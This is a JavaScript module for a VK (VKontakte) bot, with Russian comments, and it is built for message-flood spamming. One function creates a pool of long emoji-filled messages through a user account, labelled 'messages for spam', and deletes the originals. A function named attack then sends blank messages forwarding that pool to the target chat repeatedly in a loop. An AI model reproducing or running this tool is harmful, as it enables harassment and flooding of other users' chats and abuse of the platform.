const { VK, MessageContext } = require("vk-io");
const config = require("./settings");
const { baseKeyboard } = require("./keyboard");
const { generateHtmlEmojis, randomId, sleep } = require("./utils");
const chalk = require('chalk');
const { emoji } = require('@xxhax/emoji');

const uniqueMessagesCount = parseInt(config.UNIQUE_MESSAGES);
const maxMessageLength = parseInt(config.MSG_LENGTH);
const groupId = parseInt(config.GROUP_ID);
const errorTimeout = parseInt(config.ERROR_TIMEOUT);
const successTimeout = parseInt(config.SUCCESS_TIMEOUT);
const messagesCount = parseInt(config.MESSAGES_COUNT);

async function generateMessages() {
  const user = new VK({ token: config.USER_TOKEN });
  const group = new VK({ token: config.BOT_TOKEN });

  const [me] = await user.api.users.get({});

  const msgIds = [];

  console.log(chalk.yellowBright.bold.underline(`[${emoji.gear} Создание сообщений для спама]:`));

  for (let i = 0; i < uniqueMessagesCount; i++) {
    try {
      process.stdout.write(chalk.bold.underline(`${emoji.speech_balloon} Сообщение ${i + 1} из ${uniqueMessagesCount}: `))

      const clientMessageId = await user.api.messages.send({
        message: generateHtmlEmojis(maxMessageLength),
        random_id: randomId(),
        peer_id: -groupId
      });

      process.stdout.write(chalk.yellow(`${emoji["e-mail"]} Отправлено`));

      const {
        items: [clientMessage]
      } = await user.api.messages.getById({ message_ids: clientMessageId });

      process.stdout.write(chalk.green(` => ${emoji.mailbox} Получено (ждём сохранения)`));

      await sleep(errorTimeout); // Ага, длинный интервал "ошибочный", потому что это пользователь отправляет

      const {
        items: [botMessage]
      } = await group.api.messages.getByConversationMessageId({
        conversation_message_ids: clientMessage.conversation_message_id,
        peer_id: me.id
      });

      process.stdout.write(chalk.blue(` => ${emoji.file_folder} Сохранено`));

      msgIds.push(botMessage.id);

      await user.api.messages.delete({ message_ids: clientMessageId });
      process.stdout.write(chalk.red(` => ${emoji.wastebasket} Удалено`));

    } catch (error) {
      console.log(error);

      break;
    }

    console.log();
  }

  return msgIds;
}

/**
 *
 * @param {MessageContext} ctx
 * @param {number[]} forward_messages
 */
async function attack(ctx, forward_messages) {
  let firstMessageSent = false;

  for (let i = 0; i < messagesCount; i++) {
    const keyboard = baseKeyboard.clone().oneTime(firstMessageSent);

    try {
      await ctx.send("&#13;", { forward_messages, keyboard });
      await sleep(successTimeout);

      firstMessageSent = true;
    } catch (error) {
      console.log("Произошла ошибка:", error);

      await sleep(errorTimeout);
    }
  }
}

module.exports = { attack, generateMessages };
